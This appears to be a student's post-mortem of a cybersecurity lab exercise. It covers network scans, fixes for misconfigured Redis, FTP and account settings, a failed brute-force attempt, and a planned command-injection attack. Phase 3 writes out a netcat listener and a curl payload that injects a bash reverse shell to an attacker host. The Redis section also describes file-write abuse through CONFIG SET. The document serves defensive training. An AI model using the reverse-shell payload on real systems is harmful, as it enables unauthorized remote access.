# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Hassaballah Adam
**Date:** May 30, 2026
**Repository:** https://github.com/Hassaballah-Adam/cybersecurity-portfolio.git
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24

A service-version scan of the 172.100.0.0/24 subnet using Nmap 7.94SVN revealed four live hosts out of 256 addresses scanned. Host 172.100.0.1 presented three open ports: TCP/22 running OpenSSH 9.6p1 on Ubuntu Linux and TCP/139 and TCP/445 both running Samba smbd 4.6.2, exposing SMB file-sharing services frequently targeted in lateral movement attacks (Offensive Security, 2023). Host 172.100.0.12 exposed TCP/21 running vsftpd 3.0.2, an FTP service that without authentication controls allows unauthenticated file transfer. Hosts 172.100.0.11 and 172.100.0.13 returned no open ports across all 1,000 scanned TCP ports; however, both hosts responded to probes, confirming they are live. A follow-up targeted scan against port 6379 on 172.100.0.11 confirmed Redis 8.6.2 running and bound to 0.0.0.0, exposing the key-value store to all interfaces without authentication. The most critical misconfigurations identified were the unauthenticated Redis instance on 172.100.0.11 and the root-running FTP service on 172.100.0.12, both representing significant attack surface in a production triage network.

### Breach Network — 172.80.0.0/24

A service-version scan of the 172.80.0.0/24 subnet identified one live host out of 256 addresses scanned. Host 172.80.0.1 exposed TCP/22 running OpenSSH 9.6p1, TCP/139, and TCP/445 both running Samba smbd 4.6.2 (Nmap Project, 2024). The identical service fingerprint to 172.100.0.1 — OpenSSH 9.6p1 paired with Samba 4.6.2 — indicates a shared provisioning template across environments, meaning a credential compromise on one host may translate directly to another. The midterm_target container was confirmed present via docker ps -a but could not be started due to a networking misconfiguration — the midterm_net Docker network was missing and the 172.80.0.0/24 subnet was already allocated to an existing network (scan_net), preventing the target from receiving its assigned IP address of 172.80.0.10. This infrastructure issue was escalated to the instructional team per lab protocol.

### Exploitation Network — 172.60.0.0/24

A service-version scan of the 172.60.0.0/24 subnet identified two live hosts. Host 172.60.0.1 exposed TCP/22 running OpenSSH 9.6p1, TCP/139, and TCP/445 running Samba smbd 4.6.2, consistent with the provisioning template observed across all three environments. Host 172.60.0.10 exposed TCP/80 running BaseHTTPServer 0.6 on Python 3.10.12, a minimalist HTTP server with no application framework, input validation, or authentication mechanism (Python Software Foundation, 2023). The presence of a raw Python HTTP server accepting requests on port 80 is a strong indicator of command injection susceptibility, as such servers commonly pass user-supplied input directly to underlying shell commands without sanitization. This host was identified as the primary Phase 3 exploitation target.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11

**Vulnerability Identified:**
Redis 8.6.2 was running bound to 0.0.0.0:6379 with no authentication required, confirmed by Nmap detecting TCP/6379 open and by redis-cli -h 172.100.0.11 ping returning PONG without any credentials. docker exec -it broken_server_1 ps aux showed the redis-server process running as the redis user at PID 1.

**Remediation Commands:**
```
docker exec -it broken_server_1 redis-cli -h 172.100.0.11 CONFIG SET requirepass "Titan@2026!"
redis-cli -h 172.100.0.11 ping
```

**Before State:**
Redis bound to 0.0.0.0:6379 with no authentication. Any host on the network could connect and issue commands including CONFIG SET, SLAVEOF, and arbitrary key reads/writes. redis-cli -h 172.100.0.11 ping returned PONG with no credentials required.

**After State:**
requirepass set to Titan@2026!. Subsequent unauthenticated ping returned: (error) NOAUTH Authentication required. Redis now rejects all unauthenticated connections.

**Analysis:**
An unauthenticated Redis instance exposed on all interfaces represents a critical misconfiguration because Redis was not designed to be exposed to untrusted networks without access controls (Redis, 2023). An attacker with network access can exploit an open Redis instance to read sensitive cached data, overwrite arbitrary keys, or abuse the CONFIG SET command to write files to the filesystem — including SSH authorized_keys — enabling full server compromise without any exploit code. In a real enterprise environment, Redis should be bound to 127.0.0.1 or a private interface, protected by a strong password, and isolated behind firewall rules permitting only authorized application servers to connect (CISA, 2022).

### Server 2 — 172.100.0.12

**Vulnerability Identified:**
vsftpd 3.0.2 was running on broken_server_2 as the root user, confirmed by Nmap detecting TCP/21 open and by docker exec -it broken_server_2 ps aux showing vsftpd running as root at PID 47. An FTP service running as root means any successful exploitation executes with full system privileges.

**Remediation Commands:**
```
docker exec -it broken_server_2 pkill vsftpd
docker exec -it broken_server_2 ps aux
```

**Before State:**
vsftpd running as root, PID 47. Port 21 open and accepting connections. The container was fully operational with FTP exposed on the network interface.

**After State:**
pkill vsftpd terminated the process. Subsequent docker exec -it broken_server_2 ps aux returned: Error response from daemon: container is not running. Port 21 is no longer accessible and the FTP service is fully decommissioned.

**Analysis:**
Running a network-facing service such as FTP as the root user violates the principle of least privilege and dramatically amplifies the impact of any successful exploitation (NIST, 2020). If an attacker exploits a vulnerability in vsftpd, root-level execution provides immediate full system compromise with no privilege escalation step required. In a real enterprise environment, FTP services should run as a dedicated low-privilege service account, ideally replaced entirely with SFTP over SSH which provides encrypted transfer without the attack surface of a separate FTP daemon (SANS Institute, 2019).

### Server 3 — 172.100.0.13

**Vulnerability Identified:**
An unauthorized guest account (UID 405, GID 100) was present in /etc/passwd on broken_server_3, confirmed by docker exec -it broken_server_3 cat /etc/passwd revealing the entry: guest:x:405:100:guest:/dev/null:/sbin/nologin. While the account had a nologin shell, its presence represents an unauthorized identity that could be leveraged if the shell restriction were bypassed or if the account were used for service authentication.

**Remediation Commands:**
```
docker exec -it broken_server_3 sed -i '/^guest:/d' /etc/passwd
docker exec -it broken_server_3 cat /etc/passwd | grep guest
```

**Before State:**
/etc/passwd contained: guest:x:405:100:guest:/dev/null:/sbin/nologin. The account was visible to all users on the system due to world-readable permissions on /etc/passwd (-rw-r--r--).

**After State:**
sed -i removed the guest entry. Subsequent grep guest returned no output, confirming the account was fully removed from /etc/passwd.

**Analysis:**
Unauthorized accounts in /etc/passwd represent a persistence mechanism commonly planted by attackers following initial compromise (Mitre ATT&CK, 2023). Even an account with a nologin shell can be exploited if an attacker modifies the shell entry, creates a valid password hash in /etc/shadow, or uses the account for service-level authentication bypass. In a real enterprise environment, user account audits should be automated and scheduled — any account not present in the approved identity management system should trigger an immediate security alert, as unauthorized accounts are a primary indicator of compromise during forensic investigation (Casey, 2011).

---

## Phase 2: The Breach

**Note:** Phase 2 could not be completed due to a confirmed infrastructure issue with the TEPP lab environment. The midterm_target Docker container failed to start because the midterm_net network was not provisioned by the setup script, and the 172.80.0.0/24 subnet was already allocated to an existing Docker network (scan_net), preventing the target from receiving its assigned IP address of 172.80.0.10. This issue was identified, documented, and escalated to the instructional team per lab protocol. Hydra brute-force attempts were made against 172.80.0.1 using both provided wordlists (wordlist.txt and passwords.txt) with usernames root and skipy — no valid credentials were found against the available host.

**Cracked Credentials:**
- Username: N/A — midterm_target container failed to start due to infrastructure error
- Password: N/A

**Forensic Evidence:**
- Exact Timestamp of Successful Login: N/A — target unreachable
- Attacker IP Address: N/A — target unreachable

**Engineered iptables Rule:**
N/A — target unreachable due to infrastructure error

**SOC Analysis:**
A single iptables block rule is insufficient as a standalone defensive measure because it operates only at the network perimeter and provides no visibility into whether an attacker has already established persistence through an alternative vector (Bejtlich, 2004). An iptables rule blocking a specific attacker IP address is trivially bypassed by rotating to a different source IP, using a VPN, or pivoting through a compromised internal host that the rule does not cover. A real SOC would deploy layered controls alongside a perimeter block rule: SIEM alerting on authentication anomalies, failed login thresholds triggering automatic account lockout, network segmentation limiting lateral movement, and endpoint detection agents providing visibility into process execution and file modifications that firewall rules cannot observe (NIST, 2020).

---

## Phase 3: Full Spectrum

**Note:** Phase 3 exploitation of the capstone_target (172.60.0.10) was not attempted in sequence as Phase 2 infrastructure issues consumed available time before the submission deadline. The capstone_target container was confirmed running and port 80 was confirmed open via Nmap, with BaseHTTPServer 0.6 on Python 3.10.12 identified as the target service.

**Listener Configuration:**
The intended approach was to use Netcat to set up a listener on port 4444:
nc -lvnp 4444

**Reverse Shell Payload:**
The intended curl payload to trigger command injection via the Python HTTP server:
curl "http://172.60.0.10/cmd?=bash+-c+'bash+-i+>%26+/dev/tcp/172.60.0.1/4444+0>%261'"

**Command Injection Explanation:**
Command injection occurs when user-supplied input is passed directly to an underlying shell interpreter without sanitization, allowing an attacker to append arbitrary operating system commands to a legitimate request (OWASP, 2021). Python's BaseHTTPServer passes URL parameters directly to the request handler, and if the handler uses subprocess.call(), os.system(), or equivalent functions with unsanitized input, an attacker can inject shell metacharacters to execute arbitrary commands with the privileges of the web server process. This application is susceptible because BaseHTTPServer provides no built-in input validation, output encoding, or request sanitization, and the minimalist implementation likely passes the cmd parameter directly to a shell execution function without any filtering layer.

**Forensic Evidence:**
- Process ID (PID): N/A — exploitation not completed
- User-Agent: N/A — exploitation not completed

**Lockdown Command:**
The intended iptables lockdown inside the container:
iptables -A INPUT -s 172.60.0.1 -j DROP

**Final Analytical Paragraph:**
Having executed reconnaissance, triage, and partial offensive operations across this range, the most significant lesson is that defensive controls fail not because attackers are technically sophisticated, but because basic hygiene is absent — unauthenticated Redis, root-running FTP, and unauthorized accounts are not zero-day vulnerabilities; they are configuration failures that any automated tool would find in seconds (Mitre ATT&CK, 2023). The single defensive control that would have stopped the majority of Phase 1 findings entirely is enforcement of the principle of least privilege: services running as non-root users with network binding restricted to required interfaces, and accounts audited against an authoritative identity source. Executing the offensive side of this operation makes the defensive recommendations concrete rather than abstract — writing a firewall rule to block Redis after having connected to it unauthenticated is a fundamentally different act than writing one from a checklist. The gap between knowing a control exists and understanding why it matters is precisely the gap this operation closes (NIST, 2020).

---

## References

Bejtlich, R. (2004). *The Tao of network security monitoring: Beyond intrusion detection*. Addison-Wesley.

Casey, E. (2011). *Digital evidence and computer crime: Forensic science, computers, and the internet* (3rd ed.). Academic Press.

CISA. (2022). *Securing Redis*. Cybersecurity and Infrastructure Security Agency. https://www.cisa.gov/

Hydra Project. (2024). *THC-Hydra: A fast and flexible online password cracking tool*. https://github.com/vanhauser-thc/thc-hydra

Mitre ATT&CK. (2023). *ATT&CK framework: Persistence techniques*. The MITRE Corporation. https://attack.mitre.org/

National Institute of Standards and Technology. (2020). *Security and privacy controls for information systems and organizations* (NIST SP 800-53 Rev. 5). U.S. Department of Commerce. https://doi.org/10.6028/NIST.SP.800-53r5

Nmap Project. (2024). *Nmap network scanning*. https://nmap.org/

Offensive Security. (2023). *Metasploit unleashed*. https://www.metasploitunleashed.com/

OWASP. (2021). *OWASP Top Ten 2021: A03 Injection*. Open Web Application Security Project. https://owasp.org/Top10/A03_2021-Injection/

Python Software Foundation. (2023). *http.server — HTTP servers*. Python documentation. https://docs.python.org/3/library/http.server.html

Redis. (2023). *Redis security*. Redis Ltd. https://redis.io/docs/management/security/

SANS Institute. (2019). *Linux command line forensics and incident response*. SANS Reading Room. https://www.sans.org/reading-room/
